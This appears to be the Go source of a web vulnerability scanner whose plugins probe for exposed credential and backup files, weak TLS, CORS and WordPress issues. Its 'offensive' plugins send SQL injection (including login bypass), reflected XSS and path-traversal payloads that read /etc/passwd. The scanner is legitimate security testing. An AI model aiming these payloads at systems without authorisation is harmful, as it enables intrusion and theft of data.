package main

import (
	"DORM/exploitdb"
	"bufio"
	"context"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"math"
	"net"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/chromedp/chromedp"
	"github.com/jlaffaye/ftp"
	"golang.org/x/crypto/ssh"
)

// ==========================================
// HELPER FUNCTIONS
// ==========================================
func isWebPort(port int) bool {
	return port == 80 || port == 443 || port == 8080 || port == 8443 || port == 3000 || port == 5000
}

func getURL(target ScanTarget, path string) string {
	proto := "http"
	if target.Port == 443 || target.Port == 8443 {
		proto = "https"
	}
	if !strings.HasPrefix(path, "/") && path != "" {
		path = "/" + path
	}
	return fmt.Sprintf("%s://%s:%d%s", proto, target.IP, target.Port, path)
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// DORM-BUSTER (HYBRID: EMBEDDED + FILE)
type DirBusterPlugin struct{}

func (p *DirBusterPlugin) Name() string { return "DORM-BUSTER (Hybrid Scan)" }

func (p *DirBusterPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}

	// STEP 1: "Golden List" (Embedded - Always runs)
	// These will be scanned even if no wordlist folder exists.
	defaultList := []string{
		"/.env", "/.git/config", "/.htaccess", "/web.config",
		"/config.php", "/config.php.bak", "/config.php.old",
		"/backup.sql", "/db.sql", "/dump.sql",
		"/.ssh/id_rsa", "/.ssh/id_rsa.pub",
		"/server-status", "/phpmyadmin/", "/docker-compose.yml",
		"/robots.txt", "/sitemap.xml", "/admin", "/login",
	}

	// Use a Map to keep words unique
	uniqueWords := make(map[string]bool)

	// Add defaults first
	for _, w := range defaultList {
		uniqueWords[w] = true
	}

	// STEP 2: Read External Files ("wordlists" Folder)
	// Note: I renamed "Dirb Wordlist" to "wordlists" for standard English naming.
	// Make sure your folder name matches this!
	folderPath := "wordlists"
	files, err := os.ReadDir(folderPath)

	// If folder exists and is readable
	if err == nil {
		for _, file := range files {
			// Only take .txt files
			if !file.IsDir() && strings.HasSuffix(file.Name(), ".txt") {
				f, err := os.Open(filepath.Join(folderPath, file.Name()))
				if err == nil {
					scanner := bufio.NewScanner(f)
					for scanner.Scan() {
						word := strings.TrimSpace(scanner.Text())
						// Skip empty lines and comments (#)
						if len(word) > 0 && !strings.HasPrefix(word, "#") {
							// Ensure prefix / (Standardization)
							if !strings.HasPrefix(word, "/") {
								word = "/" + word
							}
							uniqueWords[word] = true // Add to list
						}
					}
					f.Close()
				}
			}
		}
	}

	// STEP 3: Scanning Engine
	var foundPaths []string

	// Iterate through all unique words
	for word := range uniqueWords {
		fullURL := getURL(target, word)

		// Request with Stealth Client (WAF bypass active)
		req, _ := http.NewRequest("GET", fullURL, nil)
		// If you use a custom Stealth Client for User-Agent, handle it here.

		resp, err := getClient().Do(req)
		if err == nil {
			// 200: Exists, 403: Exists but forbidden, 301: Redirect
			if resp.StatusCode == 200 || resp.StatusCode == 403 {
				// Soft-404 check (Optional): If page size is very small (e.g. <500 byte) and 200 OK, it's suspicious.
				// Currently just checking status codes.

				statusMark := ""
				if resp.StatusCode == 403 {
					statusMark = " [FORBIDDEN]"
				}

				foundPaths = append(foundPaths, fmt.Sprintf("%s (Code: %d)%s", word, resp.StatusCode, statusMark))
			}
			resp.Body.Close()
		}
		// Minimal delay to avoid locking the machine (Milliseconds)
		// time.Sleep(10 * time.Millisecond)
	}

	// STEP 4: Reporting
	if len(foundPaths) > 0 {
		description := fmt.Sprintf("Total %d critical files/directories found:\n", len(foundPaths))

		// Don't print everything if too many, limit to first 20
		limit := 20
		if len(foundPaths) < 20 {
			limit = len(foundPaths)
		}

		for i := 0; i < limit; i++ {
			description += "- " + foundPaths[i] + "\n"
		}

		return &Vulnerability{
			Target:      target,
			Name:        "Critical File/Directory Disclosure (Hybrid)",
			Severity:    "HIGH",
			CVSS:        7.5,
			Description: description,
			Solution:    "Delete found files from the server or check permissions (chmod/chown).",
			Reference:   "OWASP Forced Browsing",
		}
	}

	return nil
}

// ==========================================
// FIRST 10 PLUGINS (BASIC)
// ==========================================

// SERVICE FINGERPRINT
type FingerprintPlugin struct{}

func (p *FingerprintPlugin) Name() string { return "Service & Version Detection" }
func (p *FingerprintPlugin) Run(target ScanTarget) *Vulnerability {

	knownPorts := map[int]string{80: "HTTP", 443: "HTTPS", 22: "SSH", 21: "FTP", 3306: "MySQL"}
	if _, ok := knownPorts[target.Port]; !ok {
		return nil
	}

	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", target.IP, target.Port), 2*time.Second)
	if err != nil {
		return nil
	}
	defer conn.Close()

	// Banner Grabbing: Wait for service to introduce itself
	// Send GET request for Web servers
	if target.Port == 80 || target.Port == 443 || target.Port == 8080 {
		fmt.Fprintf(conn, "HEAD / HTTP/1.0\r\n\r\n")
	}

	// Listen for 2 seconds
	conn.SetReadDeadline(time.Now().Add(2 * time.Second))
	buf := make([]byte, 1024)
	n, _ := conn.Read(buf)
	banner := string(buf[:n])

	// Regex/Parsing to extract popular services
	// This part is like Nessus's brain
	detected := ""
	if strings.Contains(banner, "OpenSSH") {
		detected = "OpenSSH (" + strings.Split(banner, "\n")[0] + ")"
	} else if strings.Contains(banner, "Apache/") {
		// Extract Apache/2.4.41 (Ubuntu) part
		parts := strings.Split(banner, "Server: ")
		if len(parts) > 1 {
			detected = strings.Split(parts[1], "\r\n")[0]
		}
	} else if strings.Contains(banner, "nginx/") {
		detected = "Nginx" // You can parse version here
	} else if strings.Contains(banner, "Microsoft-IIS") {
		detected = "Microsoft IIS"
	}

	if detected != "" {
		return &Vulnerability{
			Target:      target,
			Name:        "Service Detection: " + detected,
			Severity:    "INFO",
			CVSS:        0.0,
			Description: fmt.Sprintf("Service running on port identified: %s\nBanner: %s", detected, banner),
			Solution:    "Hide service version (ServerTokens Prod).",
			Reference:   "CPE Dictionary",
		}
	}
	return nil
}

// ==========================================
// EXPLOIT-DB INTEGRATION (RAM BASED)
// ==========================================

type EDBPlugin struct{}

func (p *EDBPlugin) Name() string { return "Exploit-DB Scanner" }

func (p *EDBPlugin) Run(target ScanTarget) *Vulnerability {
	// 1. Banner Grabbing: Connect to the port and get service info

	portStr := strconv.Itoa(target.Port)
	address := net.JoinHostPort(target.IP, portStr)

	conn, err := net.DialTimeout("tcp", address, 2*time.Second)
	if err != nil {
		return nil
	}
	defer conn.Close()

	// If HTTP/HTTPS port, send a HEAD request to trigger a response
	if target.Port == 80 || target.Port == 443 || target.Port == 8080 {
		fmt.Fprintf(conn, "HEAD / HTTP/1.0\r\n\r\n")
	}

	// Read response
	conn.SetReadDeadline(time.Now().Add(2 * time.Second))
	buf := make([]byte, 1024)
	n, _ := conn.Read(buf)

	if n == 0 {
		return nil
	}
	banner := string(buf[:n])

	// 2. Banner Cleaning & Parsing
	// We try to extract valuable info like "Apache/2.4.49" or "vsftpd 2.3.4"
	lines := strings.Split(banner, "\n")
	cleanBanner := ""

	for _, line := range lines {
		// Prioritize lines containing version info
		if strings.Contains(line, "Server:") || strings.Contains(line, "SSH") || strings.Contains(line, "FTP") {
			cleanBanner = line
			break
		}
	}

	// Fallback: If no specific header found, take the first line (common in SSH/FTP)
	if cleanBanner == "" && len(lines) > 0 {
		cleanBanner = lines[0]
	}

	// Clean up garbage characters
	cleanBanner = strings.ReplaceAll(cleanBanner, "Server:", "")
	cleanBanner = strings.TrimSpace(cleanBanner)
	// Remove non-printable characters
	cleanBanner = strings.Map(func(r rune) rune {
		if r >= 32 && r != 127 {
			return r
		}
		return -1
	}, cleanBanner)

	// Don't search if the banner is too short or generic
	if len(cleanBanner) < 4 {
		return nil
	}

	// 3. CALL THE SEARCH ENGINE
	// Note: 'exploitdb' package must be imported correctly at the top of file
	results := exploitdb.Search(cleanBanner)

	if len(results) > 0 {
		return &Vulnerability{
			Target:      target,
			Name:        "Critical Exploit Detection (EDB)",
			Severity:    "CRITICAL",
			CVSS:        9.8,
			Description: fmt.Sprintf("Exploit-DB records found for service version (%s):\n\n%s", cleanBanner, strings.Join(results, "\n\n")),
			Solution:    "Update the service version or apply security patches immediately.",
			Reference:   "https://www.exploit-db.com/",
		}
	}

	return nil
}

// WEAK TLS/SSL CIPHERS (POODLE / BEAST)
type TLSCheckPlugin struct{}

func (p *TLSCheckPlugin) Name() string { return "Weak SSL/TLS Protocols" }
func (p *TLSCheckPlugin) Run(target ScanTarget) *Vulnerability {
	if target.Port != 443 && target.Port != 8443 {
		return nil
	}

	conf := &tls.Config{
		InsecureSkipVerify: true,
		MinVersion:         tls.VersionTLS10, // Try TLS 1.0
		MaxVersion:         tls.VersionTLS11, // Up to TLS 1.1
	}

	conn, err := tls.Dial("tcp", fmt.Sprintf("%s:%d", target.IP, target.Port), conf)
	if err == nil {
		defer conn.Close()
		state := conn.ConnectionState()
		ver := ""
		switch state.Version {
		case tls.VersionTLS10:
			ver = "TLS 1.0"
		case tls.VersionTLS11:
			ver = "TLS 1.1"
		}

		if ver != "" {
			return &Vulnerability{
				Target:      target,
				Name:        "Legacy SSL/TLS Protocol: " + ver,
				Severity:    "MEDIUM",
				CVSS:        5.5,
				Description: fmt.Sprintf("Server supports old and insecure protocol %s.", ver),
				Solution:    "Disable TLS 1.0 and 1.1, use only TLS 1.2+.",
				Reference:   "POODLE Attack",
			}
		}
	}
	return nil
}

// 1. OPEN PORT DETECTION
type PortCheckPlugin struct{}

func (p *PortCheckPlugin) Name() string { return "Open Port Detection" }
func (p *PortCheckPlugin) Run(target ScanTarget) *Vulnerability {
	address := net.JoinHostPort(target.IP, strconv.Itoa(target.Port))
	conn, err := net.DialTimeout("tcp", address, 3*time.Second)
	if err != nil {
		return nil
	}
	conn.Close()
	return &Vulnerability{Target: target, Name: "Open TCP Port", Severity: "INFO", CVSS: 0.0, Description: fmt.Sprintf("Port %d is open.", target.Port), Solution: "Close if not required.", Reference: ""}
}

// 2. SERVICE BANNER
type BannerGrabPlugin struct{}

func (p *BannerGrabPlugin) Name() string { return "Service Banner Info" }
func (p *BannerGrabPlugin) Run(target ScanTarget) *Vulnerability {
	address := net.JoinHostPort(target.IP, strconv.Itoa(target.Port))
	conn, err := net.DialTimeout("tcp", address, 3*time.Second)
	if err != nil {
		return nil
	}
	defer conn.Close()
	conn.SetReadDeadline(time.Now().Add(2 * time.Second))
	fmt.Fprintf(conn, "HEAD / HTTP/1.0\r\n\r\n")
	buf := make([]byte, 1024)
	n, _ := conn.Read(buf)
	if n > 0 {
		return &Vulnerability{Target: target, Name: "Service Banner", Severity: "LOW", CVSS: 2.0, Description: fmt.Sprintf("Banner: %s", string(buf[:min(n, 50)])), Solution: "Hide banner.", Reference: ""}
	}
	return nil
}

// 3. HTTP HEADER ANALYSIS (V2 - SECURITY FOCUSED)
type HTTPHeaderPlugin struct{}

func (p *HTTPHeaderPlugin) Name() string { return "Security Headers Analysis" }
func (p *HTTPHeaderPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	resp, err := getClient().Get(getURL(target, ""))
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	missing := []string{}
	// Check for critical missing headers
	headers := map[string]string{
		"Strict-Transport-Security": "HSTS missing, MITM attack possible.",
		"Content-Security-Policy":   "CSP missing, vulnerable to XSS.",
		"X-Content-Type-Options":    "Sniffing protection (nosniff) missing.",
		"Referrer-Policy":           "Referrer information might leak.",
	}

	for h, desc := range headers {
		if resp.Header.Get(h) == "" {
			missing = append(missing, h+": "+desc)
		}
	}

	if len(missing) > 0 {
		return &Vulnerability{
			Target: target, Name: "Missing Security Headers", Severity: "LOW", CVSS: 3.5,
			Description: strings.Join(missing, "\n"),
			Solution:    "Add recommended HTTP headers to server configuration.",
		}
	}
	return nil
}

// 4. SSL CHECK
type SSLCheckPlugin struct{}

func (p *SSLCheckPlugin) Name() string { return "SSL Certificate Check" }
func (p *SSLCheckPlugin) Run(target ScanTarget) *Vulnerability {
	if target.Port != 443 {
		return nil
	}
	conn, err := tls.DialWithDialer(&net.Dialer{Timeout: 4 * time.Second}, "tcp", fmt.Sprintf("%s:%d", target.IP, target.Port), &tls.Config{InsecureSkipVerify: true})
	if err != nil {
		return nil
	}
	defer conn.Close()
	if time.Now().After(conn.ConnectionState().PeerCertificates[0].NotAfter) {
		return &Vulnerability{Target: target, Name: "Expired SSL Certificate", Severity: "MEDIUM", CVSS: 5.0, Description: "Certificate has expired.", Solution: "Renew certificate.", Reference: ""}
	}
	return nil
}

// 6. CORS CHECK (Re-added)
type CORSCheckPlugin struct{}

func (p *CORSCheckPlugin) Name() string { return "CORS Misconfiguration" }
func (p *CORSCheckPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	req, _ := http.NewRequest("GET", getURL(target, ""), nil)
	req.Header.Set("Origin", "http://evil.com")
	resp, err := getClient().Do(req)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()
	if resp.Header.Get("Access-Control-Allow-Origin") == "http://evil.com" {
		return &Vulnerability{
			Target: target, Name: "Insecure CORS", Severity: "HIGH", CVSS: 7.5,
			Description: "Server allows arbitrary origin (Wildcard/Reflected).", Solution: "Restrict Origin.", Reference: "",
		}
	}
	return nil
}

// 7. WORDPRESS USER ENUM (V2 - JSON API EXPLOIT)
type WPUserEnumPlugin struct{}

func (p *WPUserEnumPlugin) Name() string { return "WordPress User Disclosure (Pro)" }
func (p *WPUserEnumPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}

	// Force modern WP-JSON API, not just ?author=1
	endpoints := []string{"/wp-json/wp/v2/users", "/?author=1"}

	for _, ep := range endpoints {
		resp, err := getClient().Get(getURL(target, ep))
		if err == nil && resp.StatusCode == 200 {
			defer resp.Body.Close()
			body, _ := io.ReadAll(resp.Body)
			// Check if slug/username exists in JSON
			if strings.Contains(string(body), "\"slug\":\"") || strings.Contains(string(body), "/author/") {
				return &Vulnerability{
					Target: target, Name: "WordPress Username Disclosure", Severity: "MEDIUM", CVSS: 5.0,
					Description: "Usernames can be extracted via WP-JSON or Author archives. Risk of Brute-force!",
					Solution:    "Restrict REST API access and disable author archives.",
				}
			}
		}
	}
	return nil
}

// 8. PHP INFO
type PHPInfoPlugin struct{}

func (p *PHPInfoPlugin) Name() string { return "PHP Info Check" }
func (p *PHPInfoPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	files := []string{"/phpinfo.php", "/info.php"}
	for _, f := range files {
		resp, err := getClient().Get(getURL(target, f))
		if err == nil && resp.StatusCode == 200 {
			buf := make([]byte, 500)
			resp.Body.Read(buf)
			resp.Body.Close()
			if strings.Contains(string(buf), "PHP Version") {
				return &Vulnerability{Target: target, Name: "PHP Info File", Severity: "HIGH", CVSS: 7.5, Description: f + " is accessible.", Solution: "Delete it.", Reference: ""}
			}
		}
	}
	return nil
}

// 9. WAF DETECTOR
type WAFDetectorPlugin struct{}

func (p *WAFDetectorPlugin) Name() string { return "WAF Detection" }
func (p *WAFDetectorPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	resp, err := getClient().Get(getURL(target, ""))
	if err != nil {
		return nil
	}
	defer resp.Body.Close()
	if strings.Contains(resp.Header.Get("Server"), "cloudflare") {
		return &Vulnerability{Target: target, Name: "WAF (Cloudflare)", Severity: "INFO", CVSS: 0.0, Description: "Cloudflare protection detected.", Solution: "-", Reference: ""}
	}
	return nil
}

// 10. OPEN REDIRECT
type OpenRedirectPlugin struct{}

func (p *OpenRedirectPlugin) Name() string { return "Open Redirect" }
func (p *OpenRedirectPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	client := &http.Client{
		Timeout:       4 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error { return http.ErrUseLastResponse },
		Transport:     &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}},
	}
	resp, err := client.Get(getURL(target, "/?url=http://example.com"))
	if err != nil {
		return nil
	}
	defer resp.Body.Close()
	if resp.StatusCode >= 300 && resp.StatusCode < 400 && strings.Contains(resp.Header.Get("Location"), "example.com") {
		return &Vulnerability{Target: target, Name: "Open Redirect", Severity: "MEDIUM", CVSS: 6.1, Description: "Open redirect detected.", Solution: "Use a whitelist.", Reference: ""}
	}
	return nil
}

// ==========================================
// NEXT 10 PLUGINS (OFFENSIVE / NEW)
// ==========================================

// ==================================================
// ==================================================
// ==================================================
// 11. SQLi - v4.2 (SMART GUESSING + TIME + POST)
// ==================================================
type SQLInjectionPlugin struct{}

func (p *SQLInjectionPlugin) Name() string { return "SQL Injection (Smart Hybrid)" }

func (p *SQLInjectionPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}

	client := getClient()
	baseURL := getURL(target, "")

	// ----------------------------------------------------
	// PART 1: SMART ERROR-BASED (Expanded Scope)
	// ----------------------------------------------------
	// Instead of just checking /?id=, we guess common files and parameters.
	endpoints := []string{
		"/",
		"/index.php", "/login.php", "/product.php", "/cart.php", "/news.php", "/search.php",
		"/Default.aspx", "/Login.aspx", "/Products.aspx", "/Details.aspx", "/Comments.aspx", // Critical for ASP.NET
		"/login", "/signin", "/search", "/view",
	}

	params := []string{"id", "cat", "item", "u", "user", "q", "search", "query", "p", "pid", "article_id", "news_id"}

	errorPayloads := []string{"'", "\"", "`", "' OR '1'='1"}

	dbErrors := []string{
		"SQL syntax", "mysql_fetch", "ORA-01756", "Oracle Error",
		"PostgreSQL query failed", "SQLServer JDBC Driver",
		"Microsoft OLE DB Provider", "Unclosed quotation mark",
		"CLI Driver", "DB2 SQL error", "SQLite/JDBCDriver",
		"System.Data.SqlClient.SqlException",
	}

	// Loop through endpoints/params to find Error-Based SQLi
	for _, ep := range endpoints {
		for _, param := range params {
			for _, payload := range errorPayloads {
				// Construct URL: http://site.com/Comments.aspx?article_id='
				targetURL := fmt.Sprintf("%s%s?%s=%s", baseURL, ep, param, url.QueryEscape(payload))

				resp, err := client.Get(targetURL)
				if err != nil {
					continue
				}

				bodyBytes, _ := io.ReadAll(resp.Body)
				resp.Body.Close()
				bodyStr := string(bodyBytes)

				for _, errMsg := range dbErrors {
					if strings.Contains(bodyStr, errMsg) {
						return &Vulnerability{
							Target:      target,
							Name:        "SQL Injection (Error-Based)",
							Severity:    "CRITICAL",
							CVSS:        9.8,
							Description: fmt.Sprintf("Database error triggered via smart parameter guessing.\nURL: %s\nPayload: %s\nMatch: %s", targetURL, payload, errMsg),
							Solution:    "Use Prepared Statements (Parameterized Queries).",
							Reference:   "OWASP A03:Injection",
						}
					}
				}
			}
		}
	}

	// ----------------------------------------------------
	// PART 2: TIME-BASED BLIND SQLi (Preserved)
	// ----------------------------------------------------
	// Keeps checking the root /?id= parameter for time delays.
	sleepSeconds := 5
	timePayloads := map[string]string{
		"MySQL/MariaDB": fmt.Sprintf("' AND SLEEP(%d)--", sleepSeconds),
		"PostgreSQL":    fmt.Sprintf("'; SELECT pg_sleep(%d)--", sleepSeconds),
		"MSSQL":         fmt.Sprintf("'; WAITFOR DELAY '00:00:%02d'--", sleepSeconds),
	}

	for dbType, payload := range timePayloads {
		// We still check the root 'id' for deep blind checks to save time
		targetURL := baseURL + "/?id=" + url.QueryEscape(payload)
		start := time.Now()
		resp, err := client.Get(targetURL)
		duration := time.Since(start)

		if err == nil {
			resp.Body.Close()
		}

		if duration.Seconds() >= float64(sleepSeconds) {
			return &Vulnerability{
				Target:      target,
				Name:        fmt.Sprintf("Blind SQL Injection (%s)", dbType),
				Severity:    "CRITICAL",
				CVSS:        9.9,
				Description: fmt.Sprintf("Server delayed response by %.2f seconds.\nTime-Based Payload: %s", duration.Seconds(), payload),
				Solution:    "Validate inputs and use Prepared Statements.",
				Reference:   "OWASP Blind SQL Injection",
			}
		}
	}

	// ----------------------------------------------------
	// PART 3: POST / LOGIN BYPASS (Preserved)
	// ----------------------------------------------------
	loginPages := []string{
		"/login.php", "/admin", "/admin.php", "/user/login", "/index.php", "/login.aspx",
	}

	postPayloads := []string{
		"' OR '1'='1", "' OR 1=1 --", "admin' --", "admin' #", "\" OR \"1\"=\"1",
	}

	formParams := []string{"username", "user", "email", "login", "id", "txtUser", "txtPassword"} // txtUser is common in ASP.NET

	for _, page := range loginPages {
		targetEndpoint := baseURL + page

		// Check baseline (invalid login)
		baseLen, err := getPostResponseLength(client, targetEndpoint, "invalid_user_x9", "invalid_pass_x9")
		if err != nil {
			continue
		}

		for _, payload := range postPayloads {
			for _, param := range formParams {
				attackLen, err := getPostResponseLength(client, targetEndpoint, payload, "123456")
				if err != nil {
					continue
				}

				diff := math.Abs(float64(attackLen - baseLen))
				isSignificant := diff > 5 || (baseLen == 0 && attackLen > 500)

				if isSignificant {
					return &Vulnerability{
						Target:      target,
						Name:        "SQL Injection (POST/Auth Bypass)",
						Severity:    "CRITICAL",
						CVSS:        9.8,
						Description: fmt.Sprintf("Login bypass detected via POST injection on %s!\nParameter: %s\nPayload: %s\nDifference: %.0f bytes", page, param, payload, diff),
						Solution:    "Sanitize all POST inputs and use Prepared Statements (PDO).",
						Reference:   "OWASP Injection / Authentication Bypass",
					}
				}
			}
		}
	}

	return nil
}

// 12. XSS (V3.1 - SMART CONTEXT AWARE)
type XSSPlugin struct{}

func (p *XSSPlugin) Name() string { return "XSS (Reflected - Smart)" }

func (p *XSSPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}

	client := getClient()
	// Dynamic canary to prevent false positives
	canary := "dormxss" + fmt.Sprintf("%d", time.Now().Unix()%1000)

	// Expanded endpoints and parameters list
	endpoints := []string{"/", "/search", "/search.php", "/results.aspx", "/index.php", "/Search.aspx"}
	params := []string{"q", "s", "search", "keyword", "query", "lang", "id", "msg"}

	// Payloads for different contexts
	payloads := []string{
		fmt.Sprintf("<script>alert('%s')</script>", canary),
		fmt.Sprintf("\"><img src=x onerror=alert('%s')>", canary),
		fmt.Sprintf("javascript:alert('%s')//", canary),
	}

	for _, ep := range endpoints {
		for _, param := range params {
			for _, payload := range payloads {
				// Construct URL: http://site.com/search.php?q=<script>...
				targetURL := fmt.Sprintf("%s%s?%s=%s", getURL(target, ""), ep, param, url.QueryEscape(payload))

				resp, err := client.Get(targetURL)
				if err == nil {
					defer resp.Body.Close()

					// Read only first 10KB for performance
					headerCheck := make([]byte, 10240)
					n, _ := resp.Body.Read(headerCheck)
					bodyString := string(headerCheck[:n])

					// 1. Check if Canary exists
					if strings.Contains(bodyString, canary) {
						// 2. Verification: Ensure dangerous tags are NOT escaped
						// If we see <script> or <img, it means the server didn't sanitize it.
						if strings.Contains(bodyString, "<script>") || strings.Contains(bodyString, "<img") || strings.Contains(bodyString, "javascript:") {
							return &Vulnerability{
								Target:      target,
								Name:        "Reflected XSS (Verified)",
								Severity:    "HIGH",
								CVSS:        7.2,
								Description: fmt.Sprintf("XSS Payload reflected in response body without encoding.\nURL: %s\nPayload: %s", targetURL, payload),
								Solution:    "Implement Context-Aware Output Encoding (HTML Entity Encode).",
								Reference:   "OWASP Cross Site Scripting (XSS)",
							}
						}
					}
				}
			}
		}
	}
	return nil
}

// 13. LFI (V2.1 - SMART GUESSING)
type LFIPlugin struct{}

func (p *LFIPlugin) Name() string { return "LFI (Local File Inclusion - Smart)" }

func (p *LFIPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}

	client := getClient()
	baseURL := getURL(target, "")

	// LFI genellikle bu dosyalarda olur
	endpoints := []string{
		"/", "/index.php", "/main.php", "/home.php", "/view.php",
		"/preview.php", "/loader.php", "/include.php", "/content.php",
	}

	// LFI'a en açık parametreler
	params := []string{"page", "file", "view", "include", "doc", "path", "load", "content", "lang"}

	payloads := []string{
		"/etc/passwd",
		"../../../../../../../../etc/passwd",
		"....//....//....//....//etc/passwd",                    // WAF Bypass
		"c:\\windows\\win.ini",                                  // Windows
		"php://filter/convert.base64-encode/resource=index.php", // Source Code Read
	}

	for _, ep := range endpoints {
		for _, param := range params {
			for _, payload := range payloads {
				// URL: http://site.com/index.php?page=../../etc/passwd
				targetURL := fmt.Sprintf("%s%s?%s=%s", baseURL, ep, param, payload)

				resp, err := client.Get(targetURL)
				if err == nil {
					defer resp.Body.Close()

					// Sadece ilk 5KB oku
					buf := make([]byte, 5120)
					n, _ := resp.Body.Read(buf)
					content := string(buf[:n])

					// İmza Kontrolü (Linux User, Windows Config, Base64 PHP)
					if strings.Contains(content, "root:x:0:0") ||
						strings.Contains(content, "[fonts]") ||
						strings.Contains(content, "PD9waH") { // <?ph (Base64)

						return &Vulnerability{
							Target:      target,
							Name:        "Local File Inclusion (LFI)",
							Severity:    "CRITICAL",
							CVSS:        8.5,
							Description: fmt.Sprintf("Critical system file read successfully.\nURL: %s\nPayload: %s", targetURL, payload),
							Solution:    "Restrict file paths using a whitelist or disable dynamic file inclusion.",
							Reference:   "OWASP LFI",
						}
					}
				}
			}
		}
	}
	return nil
}

// 14. SPRING BOOT ACTUATOR (Information Disclosure) - v2
type SpringBootPlugin struct{}

func (p *SpringBootPlugin) Name() string { return "Spring Boot Actuator (Verified)" }

func (p *SpringBootPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}

	client := getClient()

	// Check common endpoints for both Spring Boot 1.x and 2.x+
	endpoints := []string{
		"/actuator/env", // Spring Boot 2.x+ (Most common)
		"/env",          // Spring Boot 1.x (Legacy)
	}

	for _, endpoint := range endpoints {
		fullURL := getURL(target, endpoint)
		resp, err := client.Get(fullURL)

		if err == nil {
			// Read body to verify content
			bodyBytes, _ := io.ReadAll(resp.Body)
			resp.Body.Close() // Close immediately to avoid leaks in loop
			bodyString := string(bodyBytes)

			isVerified := resp.StatusCode == 200 && (strings.Contains(bodyString, "\"propertySources\"") ||
				strings.Contains(bodyString, "\"systemProperties\"") ||
				(strings.Contains(bodyString, "\"activeProfiles\"") && strings.Contains(bodyString, "server.port")))

			if isVerified {
				return &Vulnerability{
					Target:      target,
					Name:        "Spring Boot Actuator Exposed",
					Severity:    "CRITICAL",
					CVSS:        9.8,
					Description: fmt.Sprintf("Sensitive configuration and environment variables exposed via %s.\nSignature verified: Spring Boot JSON structure detected.", endpoint),
					Solution:    "Restrict access to Actuator endpoints using Spring Security or block external access via firewall.",
					Reference:   "OWASP Security Misconfiguration",
				}
			}
		}
	}
	return nil
}

// 15. GIT CONFIG
type GitConfigPlugin struct{}

func (p *GitConfigPlugin) Name() string { return "Git Configuration" }
func (p *GitConfigPlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}
	resp, err := getClient().Get(getURL(target, "/.git/config"))
	if err != nil {
		return nil
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	if resp.StatusCode == 200 && strings.Contains(string(body), "[core]") {
		return &Vulnerability{Target: target, Name: "Git Disclosure (.git)", Severity: "HIGH", CVSS: 7.5, Description: "Git config file is accessible.", Solution: "Block access.", Reference: ""}
	}
	return nil
}

// 16. BACKUP FILE DISCLOSURE (Verified via Magic Bytes)
type BackupFilePlugin struct{}

func (p *BackupFilePlugin) Name() string { return "Sensitive Backup File Discovery (Verified)" }

func (p *BackupFilePlugin) Run(target ScanTarget) *Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}

	client := getClient()

	// High-Probability Target List
	// We don't fuzz everything to keep it fast. We check the "Deadly Dozen".
	commonBackups := []string{
		"/index.php.bak",
		"/config.php.bak",
		"/wp-config.php.bak",
		"/web.config.old",
		"/backup.zip",
		"/backup.sql",
		"/www.zip",
		"/site.tar.gz",
		"/.env.save",
	}

	for _, path := range commonBackups {
		fullURL := getURL(target, path)
		resp, err := client.Get(fullURL)

		if err == nil {
			defer resp.Body.Close()

			// 1. Status Check: Must be 200 OK.
			if resp.StatusCode != 200 {
				continue
			}

			// Read first 512 bytes for signature verification
			// We don't need the whole file, just the header.
			header := make([]byte, 512)
			n, _ := resp.Body.Read(header)
			content := string(header[:n])

			isVerified := false
			fileType := "Unknown"

			// 2. MAGIC BYTES & SIGNATURE VERIFICATION
			// Prevent "Soft 404" False Positives (HTML pages returning 200 OK)

			if strings.HasSuffix(path, ".zip") {
				// ZIP files must start with "PK" (50 4B)
				if strings.HasPrefix(content, "PK") {
					isVerified = true
					fileType = "ZIP Archive"
				}
			} else if strings.HasSuffix(path, ".tar.gz") || strings.HasSuffix(path, ".tgz") {
				// GZIP header check (1F 8B)
				if len(content) > 2 && header[0] == 0x1f && header[1] == 0x8b {
					isVerified = true
					fileType = "GZIP Archive"
				}
			} else if strings.HasSuffix(path, ".sql") {
				// SQL dumps usually contain statements
				if strings.Contains(content, "INSERT INTO") || strings.Contains(content, "CREATE TABLE") || strings.Contains(content, "-- MySQL dump") {
					isVerified = true
					fileType = "SQL Database Dump"
				}
			} else if strings.HasSuffix(path, ".php.bak") || strings.HasSuffix(path, ".old") || strings.HasSuffix(path, ".save") {
				// Source code backups must contain opening tags or config keys
				// Also ensure it's NOT an HTML error page (Soft 404)
				if strings.Contains(content, "<?php") && !strings.Contains(strings.ToLower(content), "<html") {
					isVerified = true
					fileType = "Source Code Backup"
				}
			}

			if isVerified {
				return &Vulnerability{
					Target:      target,
					Name:        fmt.Sprintf("Sensitive Backup File Found (%s)", fileType),
					Severity:    "HIGH",
					CVSS:        7.5,
					Description: fmt.Sprintf("A publicly accessible backup file was discovered and verified.\nFile: %s\nType: %s", path, fileType),
					Solution:    "Remove backup files from the public web directory or restrict access via web server configuration.",
					Reference:   "OWASP Sensitive Data Exposure",
				}
			}
		}
	}
	return nil
}

